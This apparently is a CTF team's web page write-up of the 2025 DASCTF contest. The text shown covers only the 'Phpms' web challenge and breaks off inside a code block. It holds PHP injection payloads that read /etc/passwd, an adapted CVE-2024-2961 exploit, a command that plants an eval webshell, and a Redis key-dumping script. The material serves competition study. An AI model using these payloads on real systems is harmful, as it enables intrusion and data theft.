<!doctype html><html lang=en itemscope itemtype=http://schema.org/WebPage><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1"><title>2025 DASCTFä¸ŠåŠå¹´èµ› SU WriteUp -</title><meta name=description content="æ„Ÿè°¢ 08067Sec çš„å¸ˆå‚…ä»¬ç²¾å¿ƒå‡†å¤‡çš„æ¯”èµ›ï¼æœ¬æ¬¡DASCTFæˆ‘ä»¬ SU å–å¾—äº† ç¬¬ä¸€åğŸ† çš„å¥½æˆç»©ï¼Œæ„Ÿè°¢é˜Ÿé‡Œå¸ˆå‚…ä»¬çš„è¾›è‹¦ä»˜å‡ºï¼åŒæ—¶æˆ‘ä»¬ä¹Ÿåœ¨æŒç»­æ‹›äººï¼Œæ¬¢è¿å‘é€ä¸ªäººç®€ä»‹è‡³ï¼šsuers_xctf@126.com æˆ–è€…ç›´æ¥è”ç³»baozongwi QQ:2405758945ã€‚
ä»¥ä¸‹æ˜¯æˆ‘ä»¬ SU æœ¬æ¬¡ 2025 DASCTF ä¸ŠåŠå¹´èµ›çš„ éƒ¨åˆ†writeupä»¥åŠèµ›åè§£å‡ºçš„éƒ¨åˆ†é¢˜ç›®ã€‚"><meta name=author content="SUer"><script type=application/ld+json>{"@context":"http://schema.org","@type":"WebSite","name":"su-team","url":"https:\/\/su-team.cn\/"}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Organization","name":"","url":"https:\/\/su-team.cn\/"}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https:\/\/su-team.cn\/","name":"home"}},{"@type":"ListItem","position":3,"item":{"@id":"https:\/\/su-team.cn\/post\/2025-dasctf-first-half-su-wu\/","name":"2025 dasctfä¸ŠåŠå¹´èµ› su write up"}}]}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Article","author":{"name":"SUer"},"headline":"2025 DASCTFä¸ŠåŠå¹´èµ› SU WriteUp","description":"æ„Ÿè°¢ 08067Sec çš„å¸ˆå‚…ä»¬ç²¾å¿ƒå‡†å¤‡çš„æ¯”èµ›ï¼æœ¬æ¬¡DASCTFæˆ‘ä»¬ SU å–å¾—äº† ç¬¬ä¸€åğŸ† çš„å¥½æˆç»©ï¼Œæ„Ÿè°¢é˜Ÿé‡Œå¸ˆå‚…ä»¬çš„è¾›è‹¦ä»˜å‡ºï¼åŒæ—¶æˆ‘ä»¬ä¹Ÿåœ¨æŒç»­æ‹›äººï¼Œæ¬¢è¿å‘é€ä¸ªäººç®€ä»‹è‡³ï¼šsuers_xctf@126.com æˆ–è€…ç›´æ¥è”ç³»baozongwi QQ:2405758945ã€‚\nä»¥ä¸‹æ˜¯æˆ‘ä»¬ SU æœ¬æ¬¡ 2025 DASCTF ä¸ŠåŠå¹´èµ›çš„ éƒ¨åˆ†writeupä»¥åŠèµ›åè§£å‡ºçš„éƒ¨åˆ†é¢˜ç›®ã€‚\n","inLanguage":"en","wordCount":8191,"datePublished":"2025-06-21T21:29:17\u002b00:00","dateModified":"2025-06-21T21:29:17\u002b00:00","image":"https:\/\/su-team.cn\/img\/SU.jpg","keywords":["DASCTF"],"mainEntityOfPage":"https:\/\/su-team.cn\/post\/2025-dasctf-first-half-su-wu\/","publisher":{"@type":"Organization","name":"https:\/\/su-team.cn\/","logo":{"@type":"ImageObject","url":"https:\/\/su-team.cn\/img\/SU.jpg","height":60,"width":60}}}</script><meta property="og:title" content="2025 DASCTFä¸ŠåŠå¹´èµ› SU WriteUp"><meta property="og:description" content="æ„Ÿè°¢ 08067Sec çš„å¸ˆå‚…ä»¬ç²¾å¿ƒå‡†å¤‡çš„æ¯”èµ›ï¼æœ¬æ¬¡DASCTFæˆ‘ä»¬ SU å–å¾—äº† ç¬¬ä¸€åğŸ† çš„å¥½æˆç»©ï¼Œæ„Ÿè°¢é˜Ÿé‡Œå¸ˆå‚…ä»¬çš„è¾›è‹¦ä»˜å‡ºï¼åŒæ—¶æˆ‘ä»¬ä¹Ÿåœ¨æŒç»­æ‹›äººï¼Œæ¬¢è¿å‘é€ä¸ªäººç®€ä»‹è‡³ï¼šsuers_xctf@126.com æˆ–è€…ç›´æ¥è”ç³»baozongwi QQ:2405758945ã€‚
ä»¥ä¸‹æ˜¯æˆ‘ä»¬ SU æœ¬æ¬¡ 2025 DASCTF ä¸ŠåŠå¹´èµ›çš„ éƒ¨åˆ†writeupä»¥åŠèµ›åè§£å‡ºçš„éƒ¨åˆ†é¢˜ç›®ã€‚"><meta property="og:image" content="https://su-team.cn/img/SU.jpg"><meta property="og:url" content="https://su-team.cn/post/2025-dasctf-first-half-su-wu/"><meta property="og:type" content="website"><meta property="og:site_name" content="su-team"><meta name=twitter:title content="2025 DASCTFä¸ŠåŠå¹´èµ› SU WriteUp"><meta name=twitter:description content="æ„Ÿè°¢ 08067Sec çš„å¸ˆå‚…ä»¬ç²¾å¿ƒå‡†å¤‡çš„æ¯”èµ›ï¼æœ¬æ¬¡DASCTFæˆ‘ä»¬ SU å–å¾—äº† ç¬¬ä¸€åğŸ† çš„å¥½æˆç»©ï¼Œæ„Ÿè°¢é˜Ÿé‡Œå¸ˆå‚…ä»¬çš„è¾›è‹¦ä»˜å‡ºï¼åŒæ—¶æˆ‘ä»¬ä¹Ÿåœ¨æŒç»­æ‹›äººï¼Œæ¬¢è¿å‘é€ä¸ªäººç®€ä»‹è‡³ï¼šsuers_xctf@126.com æˆ–è€…ç›´æ¥è”ç³»baozongwi QQ:2405758945ã€‚
ä»¥ä¸‹æ˜¯æˆ‘ä»¬ SU æœ¬æ¬¡ 2025 DASCTF ä¸ŠåŠå¹´èµ›çš„ éƒ¨åˆ†writeupä»¥åŠèµ›åè§£å‡ºçš„éƒ¨åˆ†é¢˜ç›®ã€‚"><meta name=twitter:image content="https://su-team.cn/img/SU.jpg"><meta name=twitter:card content="summary_large_image"><link href=https://su-team.cn/img/SU.jpg rel=icon type=image/x-icon><meta name=generator content="Hugo 0.148.2"><link rel=alternate href=https://su-team.cn/index.xml type=application/rss+xml title=su-team><link rel=stylesheet href=https://su-team.cn/css/katex.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/brands.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/fontawesome.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/regular.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/solid.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/svg.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/svg-with-js.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/v4-font-face.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/v4-shims.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/v5-font-face.min.css><link rel=stylesheet href=https://su-team.cn/css/bootstrap.min.css><link rel=stylesheet href=https://su-team.cn/css/main.css><link rel=stylesheet href=https://su-team.cn/css/fonts.css><link rel=stylesheet href=https://su-team.cn/css/syntax.css><link rel=stylesheet href=https://su-team.cn/css/codeblock.css><link rel=stylesheet href=https://su-team.cn/css/photoswipe.min.css><link rel=stylesheet href=https://su-team.cn/css/photoswipe.default-skin.min.css><style>.navbar-custom .avatar-container{width:58px;height:58px;margin-top:-29px;left:50%;transform:translateX(-50%);display:flex;align-items:center;justify-content:center;background:#fff;border-radius:50%;box-shadow:0 6px 18px rgba(0,0,0,.12)}.navbar-custom .avatar-container .avatar-img-border{width:100%;height:100%;border-radius:50%;overflow:hidden;margin:0;box-shadow:none}.navbar-custom .avatar-container .avatar-img{width:100%;height:100%;object-fit:cover;border-radius:50%}@media only screen and (min-width:768px){.navbar-custom .avatar-container{width:72px;height:72px;margin-top:-36px}}</style></head><body><nav class="navbar navbar-default navbar-fixed-top navbar-custom"><div class=container-fluid><div class=navbar-header><button type=button class=navbar-toggle data-toggle=collapse data-target=#main-navbar>
<span class=sr-only>Toggle navigation</span>
<span class=icon-bar></span>
<span class=icon-bar></span>
<span class=icon-bar></span>
</button>
<a class="theme-toggle mobile-theme-toggle" href=javascript:void(0) onclick=toggleTheme() title="Toggle Theme"><span class=sr-only>Toggle Theme</span>
<svg class="theme-icon-moon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg class="theme-icon-sun" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
</a><a class=navbar-brand href=https://su-team.cn/>su-team</a></div><div class="collapse navbar-collapse" id=main-navbar><ul class="nav navbar-nav navbar-right"><li><a title=Archives href=/>Archives</a></li><li class=navlinks-container><a class=navlinks-parent role=button tabindex=0>Members</a><div class=navlinks-children><a href=/active-members>Members</a>
<a href=/pioneers>Pioneers</a></div></li><li><a title=About href=/page/about/>About</a></li><li><a title=Tags href=/tags>Tags</a></li><li class=hidden-xs><a href=javascript:void(0) class=theme-toggle onclick=toggleTheme() title="Toggle Theme"><span class=sr-only>Toggle Theme</span>
<svg class="theme-icon-moon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg class="theme-icon-sun" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></a></li></ul></div></div></nav><script>(function(){const e=localStorage.getItem("theme"),t=window.matchMedia("(prefers-color-scheme: dark)").matches;e==="dark"||!e&&t?document.body.classList.add("dark-mode"):document.body.classList.remove("dark-mode")})();function toggleTheme(){const e=document.body;e.classList.toggle("dark-mode"),e.classList.contains("dark-mode")?localStorage.setItem("theme","dark"):localStorage.setItem("theme","light")}</script><style>.theme-toggle{cursor:pointer;padding:15px;display:flex;align-items:center}.mobile-theme-toggle{float:right;padding:15px 10px;margin-top:2px}@media(min-width:768px){.mobile-theme-toggle{display:none !important}}.theme-icon-moon,.theme-icon-sun{color:#777;transition:color .3s,transform .3s}.theme-toggle:hover .theme-icon-moon,.theme-toggle:hover .theme-icon-sun{color:#333}.theme-icon-sun{display:none}.theme-icon-moon{display:block}body.dark-mode .theme-icon-sun{display:block;color:#000}body.dark-mode .theme-icon-moon{display:none}body.dark-mode{filter:none !important;background-color:#1a1a1a !important}body.dark-mode header,body.dark-mode .container,body.dark-mode footer{filter:invert(1)hue-rotate(180deg)}body.dark-mode .navbar-custom{background-color:#1a1a1a !important;border-bottom:1px solid #333}body.dark-mode .navbar-custom .container-fluid{filter:invert(1)hue-rotate(180deg)}body.dark-mode img,body.dark-mode video,body.dark-mode iframe,body.dark-mode .avatar-img,body.dark-mode .navbar-custom .avatar-container{filter:invert(1)hue-rotate(180deg)}</style><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><header class=header-section><div class="intro-header no-img"><div class=container><div class=row><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><div class=post-heading><h1>2025 DASCTFä¸ŠåŠå¹´èµ› SU WriteUp</h1><span class=post-meta><i class="fas fa-calendar"></i>&nbsp;Posted on June 21, 210617
&nbsp;|&nbsp;<i class="fas fa-clock"></i>&nbsp;39&nbsp;min
&nbsp;|&nbsp;<i class="fas fa-book"></i>&nbsp;8191&nbsp;words
&nbsp;|&nbsp;<i class="fas fa-user"></i>&nbsp;SUer</span></div></div></div></div></div></header><div class=container role=main><div class="row flex-row"><div class="col-lg-3 col-lg-offset-0 col-md-3 col-md-offset-0 hidden-sm hidden-xs"><div class=toc-sidebar><h4 class=toc-title>#<br>TABLE OF CONTENTS</h4><div class=toc-card><nav id=TableOfContents><ul><li><a href=#web>Web</a><ul><li><a href=#phpmsèµ›å>Phpmsï¼ˆèµ›åï¼‰</a></li><li><a href=#æ³½è¥¿å²›èµ›å>æ³½è¥¿å²›ï¼ˆèµ›åï¼‰</a></li></ul></li><li><a href=#misc>Misc</a><ul><li><a href=#bluetrace>BlueTrace</a></li><li><a href=#webshell-plus>Webshell Plus</a></li></ul></li><li><a href=#pwn>Pwn</a><ul><li><a href=#mini>mini</a></li><li><a href=#nsusserver>NSUSServer</a></li></ul></li><li><a href=#crypto>Crypto</a><ul><li><a href=#excessive-security>Excessive Security</a></li><li><a href=#strange-rsa>Strange RSA</a></li></ul></li><li><a href=#reverse>Reverse</a><ul><li><a href=#xuans>xuans</a></li><li><a href=#é±¼éŸ³ä¹>é±¼éŸ³ä¹</a></li><li><a href=#æ›´é€‚åˆctfå®å®ä½“è´¨çš„app>æ›´é€‚åˆCTFå®å®ä½“è´¨çš„app</a></li></ul></li></ul></nav></div></div></div><div class="col-lg-9 col-md-9"><article role=main class=blog-post><p>æ„Ÿè°¢ 08067Sec çš„å¸ˆå‚…ä»¬ç²¾å¿ƒå‡†å¤‡çš„æ¯”èµ›ï¼æœ¬æ¬¡DASCTFæˆ‘ä»¬ SU å–å¾—äº† ç¬¬ä¸€åğŸ† çš„å¥½æˆç»©ï¼Œæ„Ÿè°¢é˜Ÿé‡Œå¸ˆå‚…ä»¬çš„è¾›è‹¦ä»˜å‡ºï¼åŒæ—¶æˆ‘ä»¬ä¹Ÿåœ¨æŒç»­æ‹›äººï¼Œæ¬¢è¿å‘é€ä¸ªäººç®€ä»‹è‡³ï¼šsuers_<a href=mailto:xctf@126.com>xctf@126.com</a> æˆ–è€…ç›´æ¥è”ç³»baozongwi QQ:2405758945ã€‚</p><p>ä»¥ä¸‹æ˜¯æˆ‘ä»¬ SU æœ¬æ¬¡ 2025 DASCTF ä¸ŠåŠå¹´èµ›çš„ éƒ¨åˆ†writeupä»¥åŠèµ›åè§£å‡ºçš„éƒ¨åˆ†é¢˜ç›®ã€‚</p><p><img src=/img/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/QQ20250621-212945.jpg alt=img></p><h1 id=web>Web</h1><h2 id=phpmsèµ›å>Phpmsï¼ˆèµ›åï¼‰</h2><p>æ‰«æå‡ºgitï¼Œè¿›è¡Œgitæ¢å¤</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>dirsearch -u http://123154c5-c64a-427f-b8cf-be5127016c3a.node5.buuoj.cn:81/ --threads 3 --delay 2
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>githacker --url http://123154c5-c64a-427f-b8cf-be5127016c3a.node5.buuoj.cn/.git/ --output-folder test --delay 2 --threads 3
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>git log --oneline
</span></span><span class=line><span class=cl>git show 613dea6
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>git stash list
</span></span><span class=line><span class=cl>git stash show -p
</span></span></code></pre></td></tr></table></div></div><p><img src=/img/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/fb9dd69d-4af3-469c-adad-31e922d4d2ac.png alt=img></p><p>å‘ç°phpåŸºç¡€å‡½æ•°éƒ½ä¸å­˜åœ¨ï¼Œåªæœ‰åŸç”Ÿç±»ï¼Œç°åœ¨å¯ä»¥åˆ—å‡ºç›®å½•ä»¥åŠè¯»å–ä¸€äº›æœ‰æƒé™çš„æ–‡ä»¶</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?shell=?&gt;&lt;?php $content=new SplFileObject(&#39;no_careee.php&#39;);foreach($content as $content){echo $content.&#34;&lt;br&gt;&#34;;}?&gt;
</span></span><span class=line><span class=cl>?shell=?&gt;&lt;?php $content=new SplFileObject(&#39;/etc/passwd&#39;);foreach($content as $content){echo $content.&#34;&lt;br&gt;&#34;;}?&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>?shell=?&gt;&lt;?php $a = new DirectoryIterator(&#34;glob:///*&#34;);foreach($a as $f){echo($f-&gt;__toString().&#39;&lt;br&gt;&#39;);}
</span></span></code></pre></td></tr></table></div></div><p>å‘ç°RedisæœåŠ¡ï¼Œè¯»å–<code>/etc/redis.conf</code>å¾—åˆ°Rediså¯†ç ä¸º<code>admin123</code>ï¼Œè¿™é‡Œå¯ä»¥æ‰“CVE-2024-2961ï¼Œä¿®æ”¹expå…³é”®éƒ¨åˆ†</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=k>def</span> <span class=nf>send</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>path</span><span class=p>:</span> <span class=nb>str</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=n>Response</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;Sends given `path` to the HTTP server. Returns the response.
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;?shell=?&gt;&lt;?php $content=new SplFileObject(&#39;</span><span class=si>{</span><span class=n>path</span><span class=si>}</span><span class=s2>&#39;);foreach($content as $line)echo $line;?&gt;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=bp>self</span><span class=o>.</span><span class=n>session</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>url</span> <span class=o>+</span> <span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>download</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>path</span><span class=p>:</span> <span class=nb>str</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>bytes</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;Returns the contents of a remote file.
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>path</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;php://filter/convert.base64-encode/resource=</span><span class=si>{</span><span class=n>path</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>response</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=n>response</span><span class=o>.</span><span class=n>re</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;(.*)&#34;</span><span class=p>,</span> <span class=n>flags</span><span class=o>=</span><span class=n>re</span><span class=o>.</span><span class=n>S</span><span class=p>)</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>base64</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>æ‰§è¡Œå‘½ä»¤</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=n>python3</span> <span class=n>cnext</span><span class=o>-</span><span class=n>exploit</span><span class=o>.</span><span class=n>py</span> <span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=mi>08</span><span class=n>b32553</span><span class=o>-</span><span class=mi>2</span><span class=n>ead</span><span class=o>-</span><span class=mi>4148</span><span class=o>-</span><span class=mi>8</span><span class=n>ae2</span><span class=o>-</span><span class=mi>246361272</span><span class=n>c33</span><span class=o>.</span><span class=n>node5</span><span class=o>.</span><span class=n>buuoj</span><span class=o>.</span><span class=n>cn</span><span class=p>:</span><span class=mi>81</span><span class=o>/</span> <span class=s2>&#34;echo &#39;&lt;?php @eval(\$_POST[1]);?&gt;&#39; &gt; 1.php&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p>æ²¡æˆåŠŸï¼Œæ¢äº†ä¸€ä¸ªé¡¹ç›®æ¥å°è¯•ï¼Œhttps://github.com/kezibei/php-filter-iconv</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=o>/</span><span class=n>proc</span><span class=o>/</span><span class=bp>self</span><span class=o>/</span><span class=n>maps</span>
</span></span><span class=line><span class=cl><span class=n>å¾—åˆ°</span>
</span></span><span class=line><span class=cl><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>x86_64</span><span class=o>-</span><span class=n>linux</span><span class=o>-</span><span class=n>gnu</span><span class=o>/</span><span class=n>libc</span><span class=o>-</span><span class=mf>2.31</span><span class=o>.</span><span class=n>so</span>
</span></span></code></pre></td></tr></table></div></div><p>ç„¶åä¿®æ”¹exp</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl><span class=nv>maps_path</span> <span class=o>=</span> <span class=s1>&#39;./maps&#39;</span>
</span></span><span class=line><span class=cl><span class=nv>cmd</span> <span class=o>=</span> <span class=s1>&#39;echo 1 &gt; /tmp/1.txt&#39;</span>
</span></span><span class=line><span class=cl><span class=nv>sleep_time</span> <span class=o>=</span> <span class=m>1</span>
</span></span><span class=line><span class=cl><span class=nv>padding</span> <span class=o>=</span> <span class=m>20</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> not os.path.exists<span class=o>(</span>maps_path<span class=o>)</span>:
</span></span><span class=line><span class=cl>    exit<span class=o>(</span><span class=s2>&#34;[-]no maps file&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>regions</span> <span class=o>=</span> get_regions<span class=o>(</span>maps_path<span class=o>)</span>
</span></span><span class=line><span class=cl>heap, <span class=nv>libc_info</span> <span class=o>=</span> get_symbols_and_addresses<span class=o>(</span>regions<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>libc_path</span> <span class=o>=</span> libc_info.path
</span></span><span class=line><span class=cl>print<span class=o>(</span><span class=s2>&#34;[*]download: &#34;</span>+libc_path<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>libc_path</span> <span class=o>=</span> <span class=s1>&#39;./libc-2.31.so&#39;</span>
</span></span><span class=line><span class=cl><span class=k>if</span> not os.path.exists<span class=o>(</span>libc_path<span class=o>)</span>:
</span></span><span class=line><span class=cl>    exit<span class=o>(</span><span class=s2>&#34;[-]no libc file&#34;</span><span class=o>)</span>
</span></span></code></pre></td></tr></table></div></div><p>æˆåŠŸäº†ï¼Œåˆ†æ®µå†™å…¥shå‡†å¤‡å’ŒRedisäº¤äº’</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl><span class=cp>#!/bin/bash
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=nv>h</span><span class=o>=</span>127.0.0.1<span class=p>;</span><span class=nv>p</span><span class=o>=</span>6379<span class=p>;</span><span class=nv>a</span><span class=o>=</span>admin123
</span></span><span class=line><span class=cl><span class=nv>k</span><span class=o>=</span><span class=k>$(</span>redis-cli -h <span class=nv>$h</span> -p <span class=nv>$p</span> -a <span class=nv>$a</span> --raw KEYS <span class=s1>&#39;*&#39;</span><span class=k>)</span>
</span></span><span class=line><span class=cl><span class=k>for</span> x in <span class=nv>$k</span><span class=p>;</span><span class=k>do</span>
</span></span><span class=line><span class=cl> <span class=nv>v</span><span class=o>=</span><span class=k>$(</span>redis-cli -h <span class=nv>$h</span> -p <span class=nv>$p</span> -a <span class=nv>$a</span> --raw GET <span class=nv>$x</span><span class=k>)</span>
</span></span><span class=line><span class=cl> <span class=nb>echo</span> <span class=nv>$x</span><span class=o>=</span>&gt;<span class=nv>$v</span>&gt;/tmp/2.txt
</span></span><span class=line><span class=cl><span class=k>done</span>
</span></span></code></pre></td></tr></table></div></div><p>å¤„ç†å‹ç¼©ï¼Œé¿å…é•¿åº¦è¶…è¿‡</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl>gzip -c 1.sh <span class=p>|</span> base64 -w <span class=m>0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>echo</span> H4sICAOuVmgAAzEuc2gAjcuxCoMwGEXhPU9xS3+wFmKqQqVI3KRDx3bpGI2SYE2CivXx6yOUs3zLOR5EY51o1GyYkWlWJJe9tAzymhe3UkmlR+vSLGeDpNPUaTvz9mPBDciAB1AAVyAFzif1xaN+PxGdo5j1fsIG60BDqT3D+td/r1+gLWboWuN3yYrWSixjEFmybAvT3nXsBzLb30e1AAAA <span class=p>|</span> base64 -d <span class=p>|</span> gzip -d &gt; /tmp/1.sh
</span></span></code></pre></td></tr></table></div></div><p>æœ€åå‘ç°mapså’Œlibcå’ŒåŠ¨æ€çš„ï¼Œæ‰€ä»¥å’Œå‡ºé¢˜äºº<code>@L1mbo</code>äº¤æµï¼Œå¹¶ä¸”è¦åˆ°äº†expï¼Œè‡ªå·±ä¿®æ”¹äº†ä¸€ä¸‹ï¼Œå®³çš„æ˜¯ä¸€æŠŠé”å•Š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
